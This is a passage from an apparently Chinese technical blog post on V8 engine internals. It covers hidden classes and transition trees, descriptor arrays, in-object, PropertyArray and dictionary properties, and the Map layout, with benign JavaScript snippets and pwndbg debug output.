&#x27;c&#x27;&quot;| D[HC 3]</span><br><span class="line">    B --&gt;|&quot;Add &#x27;d&#x27;&quot;| E[HC 4]</span><br><span class="line">    E --&gt;|&quot;Add &#x27;c&#x27;&quot;| F[HC 5]</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>再举一个例子🌰，看看Descriptor,这里o1 o2一开始属性一样，共享HiddenClass，后面加入不同属性，transition tree产生了分支</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;<span class="attr">a</span>: <span class="string">&quot;foo&quot;</span>&#125;;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o1);</span><br><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="string">&quot;foo1&quot;</span>&#125;;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o2);</span><br><span class="line">o1.<span class="property">b</span> = <span class="string">&quot;bar&quot;</span>;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o1);</span><br><span class="line">o2.<span class="property">d</span> = <span class="string">&quot;bar2&quot;</span>;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o2);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x35d08114ddd1</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x3a1af794ab39</span>&gt;</span><br><span class="line"><span class="number">0x35d08114de21</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x3a1af794ab39</span>&gt;</span><br><span class="line"><span class="number">0x35d08114ddd1</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x3a1af794ab89</span>&gt;</span><br><span class="line"><span class="number">0x35d08114de21</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x3a1af794abd9</span>&gt;</span><br><span class="line">pwndbg&gt; job <span class="number">0x3a1af794ab89</span> <span class="comment">//看看o1的Hidden Class</span></span><br><span class="line"><span class="number">0x3a1af794ab89</span>: [<span class="title class_">Map</span>]</span><br><span class="line"> - <span class="attr">type</span>: <span class="variable constant_">JS_OBJECT_TYPE</span></span><br><span class="line"> - instance <span class="attr">size</span>: <span class="number">32</span></span><br><span class="line"> - inobject <span class="attr">properties</span>: <span class="number">1</span></span><br><span class="line"> - elements <span class="attr">kind</span>: <span class="variable constant_">HOLEY_ELEMENTS</span></span><br><span class="line"> - unused property <span class="attr">fields</span>: <span class="number">2</span></span><br><span class="line"> - enum <span class="attr">length</span>: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back <span class="attr">pointer</span>: <span class="number">0x3a1af794ab39</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">HOLEY_ELEMENTS</span>)&gt;</span><br><span class="line"> - prototype_validity <span class="attr">cell</span>: <span class="number">0x30dcecd9f9f1</span> &lt;<span class="title class_">Cell</span> value= <span class="number">0</span>&gt;</span><br><span class="line"> - instance <span class="title function_">descriptors</span> (own) #<span class="number">2</span>: <span class="number">0x35d08114de41</span> &lt;<span class="title class_">DescriptorArray</span>[<span class="number">2</span>]&gt; <span class="comment">//这里存储Descriptor</span></span><br><span class="line"> - layout <span class="attr">descriptor</span>: (nil)</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x30dcecd82091</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x3a1af7940229</span>&gt;</span><br><span class="line"> - <span class="attr">constructor</span>: <span class="number">0x30dcecd820c9</span> &lt;<span class="title class_">JSFunction</span> <span class="title class_">Object</span> (sfi = <span class="number">0x3d338a2857e9</span>)&gt;</span><br><span class="line"> - dependent <span class="attr">code</span>: <span class="number">0x0f08ee9c02c1</span> &lt;<span class="title class_">Other</span> heap <span class="title function_">object</span> (<span class="variable constant_">WEAK_FIXED_ARRAY_TYPE</span>)&gt;</span><br><span class="line"> - construction <span class="attr">counter</span>: <span class="number">0</span></span><br><span class="line">pwndbg&gt; job <span class="number">0x35d08114de41</span> <span class="comment">//跟进DescriptorArray</span></span><br><span class="line"><span class="number">0x35d08114de41</span>: [<span class="title class_">DescriptorArray</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x0f08ee9c0271</span> &lt;<span class="title class_">Map</span>&gt;</span><br><span class="line"> - <span class="attr">enum_cache</span>: empty</span><br><span class="line"> - nof slack <span class="attr">descriptors</span>: <span class="number">0</span></span><br><span class="line"> - nof <span class="attr">descriptors</span>: <span class="number">2</span></span><br><span class="line"> - raw marked <span class="attr">descriptors</span>: mc epoch <span class="number">0</span>, marked <span class="number">0</span></span><br><span class="line">  [<span class="number">0</span>]: #<span class="title function_">a</span> (<span class="keyword">const</span> data field <span class="number">0</span>:h, <span class="attr">p</span>: <span class="number">0</span>, <span class="attr">attrs</span>: [<span class="variable constant_">WEC</span>]) @ <span class="title class_">Any</span>  <span class="comment">//#a a是key，data field后面的0是在原属性数组中的位置索引</span></span><br><span class="line">  [<span class="number">1</span>]: #<span class="title function_">b</span> (<span class="keyword">const</span> data field <span class="number">1</span>:h, <span class="attr">p</span>: <span class="number">1</span>, <span class="attr">attrs</span>: [<span class="variable constant_">WEC</span>]) @ <span class="title class_">Any</span></span><br></pre></td></tr></table></figure></div><p> transition tree中的所有HiddenClass(Map)不会被移除，因为将来遇到相同结构还会复用，举个例子🌰</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;<span class="attr">a</span>: <span class="string">&quot;foo&quot;</span>&#125;;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o1);</span><br><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="string">&quot;foo1&quot;</span>&#125;;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o2);</span><br><span class="line">o1.<span class="property">b</span> = <span class="string">&quot;bar&quot;</span>;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o1);</span><br><span class="line">o2.<span class="property">d</span> = <span class="string">&quot;bar2&quot;</span>;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o2);</span><br><span class="line"><span class="keyword">let</span> o3 = &#123;<span class="attr">a</span>: <span class="string">&quot;foo2&quot;</span>&#125;;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o3);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x2301f01cddf9</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x3dcc32d4ab39</span>&gt;<span class="comment">//*</span></span><br><span class="line"><span class="number">0x2301f01cde49</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x3dcc32d4ab39</span>&gt;<span class="comment">//*</span></span><br><span class="line"><span class="number">0x2301f01cddf9</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x3dcc32d4ab89</span>&gt;</span><br><span class="line"><span class="number">0x2301f01cde49</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x3dcc32d4abd9</span>&gt;</span><br><span class="line"><span class="number">0x2301f01cdf49</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x3dcc32d4ab39</span>&gt;<span class="comment">//map复用</span></span><br></pre></td></tr></table></figure></div><blockquote><p>💡属性名称一样但顺序不同的话，map也不同</p></blockquote><h3 id="property"><a href="#property" class="headerlink" title="property"></a>property</h3><p>property⼜分为in-object property和普通的property</p><ul><li><p>in-object property,直接保存在js object⾥的property</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i &lt;<span class="number">4</span>; i++)&#123;</span><br><span class="line">o1[<span class="string">&quot;p&quot;</span> + i.<span class="title function_">toString</span>()] = i;</span><br><span class="line">&#125;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o1);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x3794877cdd99</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x3f3bffd4abd9</span>&gt;</span><br><span class="line">pwndbg&gt; job <span class="number">0x3794877cdd99</span></span><br><span class="line"><span class="number">0x3794877cdd99</span>: [<span class="variable constant_">JS_OBJECT_TYPE</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x3f3bffd4abd9</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">HOLEY_ELEMENTS</span>)&gt; [<span class="title class_">FastProperties</span>]</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x0de3c5002091</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x3f3bffd40229</span>&gt;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x38e8d9140c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; [<span class="variable constant_">HOLEY_ELEMENTS</span>]</span><br><span class="line"> - <span class="attr">properties</span>: <span class="number">0x38e8d9140c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; &#123; <span class="comment">//4个property直接内嵌在object中，本来用于放property的FixedArray大小为0</span></span><br><span class="line">    #<span class="attr">p0</span>: <span class="number">0</span> (<span class="keyword">const</span> data field <span class="number">0</span>)</span><br><span class="line">    #<span class="attr">p1</span>: <span class="number">1</span> (<span class="keyword">const</span> data field <span class="number">1</span>)</span><br><span class="line">    #<span class="attr">p2</span>: <span class="number">2</span> (<span class="keyword">const</span> data field <span class="number">2</span>)</span><br><span class="line">    #<span class="attr">p3</span>: <span class="number">3</span> (<span class="keyword">const</span> data field <span class="number">3</span>)</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; x/8gx  <span class="number">0x3794877cdd99</span>-<span class="number">1</span></span><br><span class="line"><span class="number">0x3794877cdd98</span>:<span class="number">0x00003f3bffd4abd9</span><span class="number">0x000038e8d9140c71</span></span><br><span class="line"><span class="number">0x3794877cdda8</span>:<span class="number">0x000038e8d9140c71</span><span class="number">0x0000000000000000</span> <span class="comment">//0</span></span><br><span class="line"><span class="number">0x3794877cddb8</span>:<span class="number">0x0000000100000000</span><span class="number">0x0000000200000000</span> <span class="comment">//1   2</span></span><br><span class="line"><span class="number">0x3794877cddc8</span>:<span class="number">0x0000000300000000</span><span class="number">0x000038e8d9141f49</span> <span class="comment">//3   </span></span><br></pre></td></tr></table></figure></div></li><li><p>普通的property：给object的property超过一定数量后，后面的property就会存到PropertyArray中</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i &lt;<span class="number">8</span>; i++)&#123;</span><br><span class="line">o1[<span class="string">&quot;p&quot;</span> + i.<span class="title function_">toString</span>()] = i;</span><br><span class="line">&#125;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o1);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x1e9b0634dd99</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x1501a910ad19</span>&gt;</span><br><span class="line">pwndbg&gt; job <span class="number">0x1e9b0634dd99</span> <span class="comment">//看看Object</span></span><br><span class="line"><span class="number">0x1e9b0634dd99</span>: [<span class="variable constant_">JS_OBJECT_TYPE</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x1501a910ad19</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">HOLEY_ELEMENTS</span>)&gt; [<span class="title class_">FastProperties</span>]</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x31170e202091</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x1501a9100229</span>&gt;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x0a7913900c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; [<span class="variable constant_">HOLEY_ELEMENTS</span>]</span><br><span class="line"> - <span class="attr">properties</span>: <span class="number">0x1e9b0634e331</span> &lt;<span class="title class_">PropertyArray</span>[<span class="number">6</span>]&gt; &#123;<span class="comment">//前面4个是in-object property，后面就是普通的property</span></span><br><span class="line">    #<span class="attr">p0</span>: <span class="number">0</span> (<span class="keyword">const</span> data field <span class="number">0</span>)</span><br><span class="line">    #<span class="attr">p1</span>: <span class="number">1</span> (<span class="keyword">const</span> data field <span class="number">1</span>)</span><br><span class="line">    #<span class="attr">p2</span>: <span class="number">2</span> (<span class="keyword">const</span> data field <span class="number">2</span>)</span><br><span class="line">    #<span class="attr">p3</span>: <span class="number">3</span> (<span class="keyword">const</span> data field <span class="number">3</span>)</span><br><span class="line">    #<span class="attr">p4</span>: <span class="number">4</span> (<span class="keyword">const</span> data field <span class="number">4</span>) properties[<span class="number">0</span>]</span><br><span class="line">    #<span class="attr">p5</span>: <span class="number">5</span> (<span class="keyword">const</span> data field <span class="number">5</span>) properties[<span class="number">1</span>]</span><br><span class="line">    #<span class="attr">p6</span>: <span class="number">6</span> (<span class="keyword">const</span> data field <span class="number">6</span>) properties[<span class="number">2</span>]</span><br><span class="line">    #<span class="attr">p7</span>: <span class="number">7</span> (<span class="keyword">const</span> data field <span class="number">7</span>) properties[<span class="number">3</span>]</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; job <span class="number">0x1e9b0634e331</span> <span class="comment">//看看PropertyArray</span></span><br><span class="line"><span class="number">0x1e9b0634e331</span>: [<span class="title class_">PropertyArray</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x0a7913901909</span> &lt;<span class="title class_">Map</span>&gt;</span><br><span class="line"> - <span class="attr">length</span>: <span class="number">6</span></span><br><span class="line"> - <span class="attr">hash</span>: <span class="number">0</span></span><br><span class="line">           <span class="number">0</span>: <span class="number">4</span></span><br><span class="line">           <span class="number">1</span>: <span class="number">5</span></span><br><span class="line">           <span class="number">2</span>: <span class="number">6</span></span><br><span class="line">           <span class="number">3</span>: <span class="number">7</span></span><br><span class="line">         <span class="number">4</span>-<span class="number">5</span>: <span class="number">0x0a79139004d1</span> &lt;<span class="literal">undefined</span>&gt;</span><br></pre></td></tr></table></figure></div><blockquote><p>🤔PropertyArray的空间似乎是按3的倍数来，后来试试一个有12个属性的object，去掉4个in-object property，剩下8个，但是创建了一个大小为9的PropertyArray</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i &lt;<span class="number">12</span>; i++)&#123;</span><br><span class="line">o1[<span class="string">&quot;p&quot;</span> + i.<span class="title function_">toString</span>()] = i;</span><br><span class="line">&#125;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o1);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x005b0240dd99</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x1c32d7d8ae59</span>&gt;</span><br><span class="line">pwndbg&gt; job <span class="number">0x005b0240dd99</span></span><br><span class="line"><span class="number">0x5b0240dd99</span>: [<span class="variable constant_">JS_OBJECT_TYPE</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x1c32d7d8ae59</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">HOLEY_ELEMENTS</span>)&gt; [<span class="title class_">FastProperties</span>]</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x330042642091</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x1c32d7d80229</span>&gt;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x139f6b440c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; [<span class="variable constant_">HOLEY_ELEMENTS</span>]</span><br><span class="line"> - <span class="attr">properties</span>: <span class="number">0x005b0240e5f9</span> &lt;<span class="title class_">PropertyArray</span>[<span class="number">9</span>]&gt; &#123;</span><br><span class="line">    #<span class="attr">p0</span>: <span class="number">0</span> (<span class="keyword">const</span> data field <span class="number">0</span>)</span><br><span class="line">    #<span class="attr">p1</span>: <span class="number">1</span> (<span class="keyword">const</span> data field <span class="number">1</span>)</span><br><span class="line">    #<span class="attr">p2</span>: <span class="number">2</span> (<span class="keyword">const</span> data field <span class="number">2</span>)</span><br><span class="line">    #<span class="attr">p3</span>: <span class="number">3</span> (<span class="keyword">const</span> data field <span class="number">3</span>)</span><br><span class="line">    #<span class="attr">p4</span>: <span class="number">4</span> (<span class="keyword">const</span> data field <span class="number">4</span>) properties[<span class="number">0</span>]</span><br><span class="line">    #<span class="attr">p5</span>: <span class="number">5</span> (<span class="keyword">const</span> data field <span class="number">5</span>) properties[<span class="number">1</span>]</span><br><span class="line">    #<span class="attr">p6</span>: <span class="number">6</span> (<span class="keyword">const</span> data field <span class="number">6</span>) properties[<span class="number">2</span>]</span><br><span class="line">    #<span class="attr">p7</span>: <span class="number">7</span> (<span class="keyword">const</span> data field <span class="number">7</span>) properties[<span class="number">3</span>]</span><br><span class="line">    #<span class="attr">p8</span>: <span class="number">8</span> (<span class="keyword">const</span> data field <span class="number">8</span>) properties[<span class="number">4</span>]</span><br><span class="line">    #<span class="attr">p9</span>: <span class="number">9</span> (<span class="keyword">const</span> data field <span class="number">9</span>) properties[<span class="number">5</span>]</span><br><span class="line">    #<span class="attr">p10</span>: <span class="number">10</span> (<span class="keyword">const</span> data field <span class="number">10</span>) properties[<span class="number">6</span>]</span><br><span class="line">    #<span class="attr">p11</span>: <span class="number">11</span> (<span class="keyword">const</span> data field <span class="number">11</span>) properties[<span class="number">7</span>]</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></div></blockquote></li></ul><h3 id="fast-property-amp-slow-property"><a href="#fast-property-amp-slow-property" class="headerlink" title="fast property&amp;slow property"></a>fast property&amp;slow property</h3><p>propert也可以分为fast property和slow property</p><ul><li><p>fast property：保存在线性排序的数组⾥的property，前面提到的在PropertyArray中的都是fast property</p></li><li><p>slow property：为了支持频繁地添加&#x2F;删除属性而不更新HiddenClass与DescriptorArray，v8支持slow property，有slow property的Object有一个自包含的属性字典来存储属性信息</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/image-20241115181255404.png"                      alt="image-20241115181255404"                ><figcaption>image-20241115181255404</figcaption></figure></p></li></ul><p>举个例子🌰添加100次属性</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i &lt;<span class="number">100</span>; i++)&#123;</span><br><span class="line">o1[<span class="string">&quot;p&quot;</span> + i.<span class="title function_">toString</span>()] = i;</span><br><span class="line">&#125;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o1);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x2d695c28dd99</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x3221bcb463a9</span>&gt;</span><br><span class="line">pwndbg&gt; job <span class="number">0x2d695c28dd99</span></span><br><span class="line"><span class="number">0x2d695c28dd99</span>: [<span class="variable constant_">JS_OBJECT_TYPE</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x3221bcb463a9</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">HOLEY_ELEMENTS</span>)&gt; [<span class="title class_">DictionaryProperties</span>]</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x31c8c1a42091</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x3221bcb40229</span>&gt;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x151002c00c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; [<span class="variable constant_">HOLEY_ELEMENTS</span>]</span><br><span class="line"> - <span class="attr">properties</span>: <span class="number">0x2d695c290969</span> &lt;<span class="title class_">NameDictionary</span>[<span class="number">773</span>]&gt; &#123; <span class="comment">//这个时候再看已经变成了NameDictionary</span></span><br><span class="line">   #<span class="attr">p67</span>: <span class="number">67</span> (data, <span class="attr">dict_index</span>: <span class="number">68</span>, <span class="attr">attrs</span>: [<span class="variable constant_">WEC</span>])</span><br><span class="line">   #<span class="attr">p96</span>: <span class="number">96</span> (data, <span class="attr">dict_index</span>: <span class="number">97</span>, <span class="attr">attrs</span>: [<span class="variable constant_">WEC</span>])</span><br><span class="line">   #<span class="attr">p36</span>: <span class="number">36</span> (data, <span class="attr">dict_index</span>: <span class="number">37</span>, <span class="attr">attrs</span>: [<span class="variable constant_">WEC</span>])</span><br><span class="line">   #<span class="attr">p98</span>: <span class="number">98</span> (data, <span class="attr">dict_index</span>: <span class="number">99</span>, <span class="attr">attrs</span>: [<span class="variable constant_">WEC</span>])</span><br><span class="line">   <span class="comment">//......</span></span><br></pre></td></tr></table></figure></div><h3 id="Map结构"><a href="#Map结构" class="headerlink" title="Map结构"></a>Map结构</h3><p>可以看一下src&#x2F;objects&#x2F;map.h中的注释</p><p>主要关注4个连续的Int</p><ul><li>第一个int值主要是一些大小相关，instance_size..</li><li>🌟第二个int值比较关键，代表了type，描述map对应的object的类型</li><li>第三个int值主要是一些descriptors，比如前面说的properties长度之类的</li><li>第四个int值主要是64相关的一些额外信息，不太重要</li></ul><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// All heap objects have a Map that describes their structure.</span></span><br><span class="line"><span class="comment">//  A Map contains information about:</span></span><br><span class="line"><span class="comment">//  - Size information about the object</span></span><br><span class="line"><span class="comment">//  - How to iterate over an object (for garbage collection)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Map layout:</span></span><br><span class="line"><span class="comment">// +---------------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">// |   _ Type _    | _ Description _                             |</span></span><br><span class="line"><span class="comment">// +---------------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">// | TaggedPointer | map - Always a pointer to the MetaMap root  |</span></span><br><span class="line"><span class="comment">// +---------------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">// | Int           | The first int field                         |</span></span><br><span class="line"><span class="comment">//  `---+----------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">//      | Byte     | [instance_size]                             |</span></span><br><span class="line"><span class="comment">//      +----------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">//      | Byte     | If Map for a primitive type:                |</span></span><br><span class="line"><span class="comment">//      |          |   native context index for constructor fn   |</span></span><br><span class="line"><span class="comment">//      |          | If Map for an Object type:                  |</span></span><br><span class="line"><span class="comment">//      |          |   inobject properties start offset in words |</span></span><br><span class="line"><span class="comment">//      +----------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">//      | Byte     | [used_or_unused_instance_size_in_words]     |</span></span><br><span class="line"><span class="comment">//      |          | For JSObject in fast mode this byte encodes |</span></span><br><span class="line"><span class="comment">//      |          | the size of the object that includes only   |</span></span><br><span class="line"><span class="comment">//      |          | the used property fields or the slack size  |</span></span><br><span class="line"><span class="comment">//      |          | in properties backing store.                |</span></span><br><span class="line"><span class="comment">//      +----------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">//      | Byte     | [visitor_id]                                |</span></span><br><span class="line"><span class="comment">// +----+----------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">// | Int           | The second int field                        |🌟</span></span><br><span class="line"><span class="comment">//  `---+----------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">//      | Short    | [instance_type]                             |</span></span><br><span class="line"><span class="comment">//      +----------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">//      | Byte     | [bit_field]                                 |</span></span><br><span class="line"><span class="comment">//      |          |   - has_non_instance_prototype (bit 0)      |</span></span><br><span class="line"><span class="comment">//      |          |   - is_callable (bit 1)                     |</span></span><br><span 